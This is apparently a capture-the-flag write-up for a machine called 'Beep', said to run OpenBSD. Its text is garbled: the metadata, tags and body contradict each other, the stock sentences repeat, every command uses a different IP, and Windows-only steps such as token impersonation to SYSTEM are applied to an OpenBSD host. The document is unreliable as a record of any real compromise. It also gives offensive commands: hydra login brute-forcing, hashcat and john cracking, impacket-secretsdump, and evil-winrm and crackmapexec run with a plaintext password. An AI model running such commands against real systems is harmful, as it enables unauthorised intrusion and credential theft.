---
TitleSEO: "PwnTillDawn — Beep (Easy OpenBSD) | ZureFX"
TitlePost: "PwnTillDawn — Beep (Easy OpenBSD)"
Author: "ZureFX"
Description: "Full writeup for PwnTillDawn Beep. CORS Misconfiguration and SUID Binary to achieve easy compromise on OpenBSD."
Keywords: "web, insane, hard, active directory, tryhackme"
URL: "https://zurefx.github.io/writeups/htb-beep-569.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-beep-569/"
Date: "2024-10-07"
Tags: "Web, Insane, Hard, Active Directory, TryHackMe"
Section: "writeups"
Lang: "en"
main_img: "htb-beep-569"
Permalink: "/writeups/htb-beep-569.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Beep** is rated **Easy** on PwnTillDawn. It runs **OpenBSD** and the IP address during this analysis was `10.121.191.23`.

### Objectives

The kernel version was outdated and vulnerable to a publicly known exploit. Authentication bypass was achieved through careful manipulation of the login mechanism.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.118.129.220
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

The kernel version was outdated and vulnerable to a publicly known exploit. Lateral movement was facilitated by reusing discovered credentials across services.

### Service Enumeration

The backup files contained sensitive information that should not have been accessible. The kernel version was outdated and vulnerable to a publicly known exploit. The web application was vulnerable to Server-Side Template Injection (SSTI).

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.50.12.220 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

The scheduled task ran with elevated privileges and could be abused for escalation. The web application was vulnerable to Server-Side Template Injection (SSTI).

### Web Enumeration

Initial enumeration revealed several interesting open ports on the target. Lateral movement was facilitated by reusing discovered credentials across services.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.69.145.77
```

The web application was vulnerable to Server-Side Template Injection (SSTI). The scheduled task ran with elevated privileges and could be abused for escalation. Token impersonation allowed elevation to SYSTEM privileges on the target.

## Exploitation

### Vulnerability Identification

Lateral movement was facilitated by reusing discovered credentials across services. The service account had excessive permissions assigned in Active Directory. The database credentials were hardcoded in the application source code.

Key finding: **Pass the Hash**.

The kernel version was outdated and vulnerable to a publicly known exploit. The application stored sensitive credentials in an unencrypted configuration file.

### Initial Access

Token impersonation allowed elevation to SYSTEM privileges on the target. The kernel version was outdated and vulnerable to a publicly known exploit.

```bash
evil-winrm -i 10.54.101.184 -u administrator -p 'P@ssw0rd!'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.113.70.36/FUZZ
```

Post-exploitation enumeration revealed a path to domain administrator privileges. Network traffic analysis revealed unencrypted communications containing user credentials. Weak file permissions allowed modification of critical system files.

## Privilege Escalation

### Enumeration

The kernel version was outdated and vulnerable to a publicly known exploit. Group Policy Preferences contained encrypted but recoverable credentials. The web application was vulnerable to Server-Side Template Injection (SSTI).

```powershell
feroxbuster -h
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.85.130.208 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

### Exploitation

Privilege escalation was possible due to misconfigured sudo permissions. The kernel version was outdated and vulnerable to a publicly known exploit.

```powershell
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.122.3.174 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
crackmapexec smb 10.16.135.251 -u administrator -p 'P@ssw0rd!' --shares
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.75.106.71/FUZZ
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.21.142.195 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

The target system was identified as running a vulnerable version of the service. The application stored sensitive credentials in an unencrypted configuration file.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

Lateral movement was facilitated by reusing discovered credentials across services. The service was running without proper input validation, leading to injection vulnerabilities.

## Summary

### Tools Used

- `kerbrute`
- `atexec`
- `netcat`
- `mimikatz`
- `GetNPUsers`
- `msfvenom`
- `bloodhound`
- `GetUserSPNs`

### Key Takeaways

- CORS Misconfiguration
- SUID Binary
- Open Redirect
- Pass the Hash
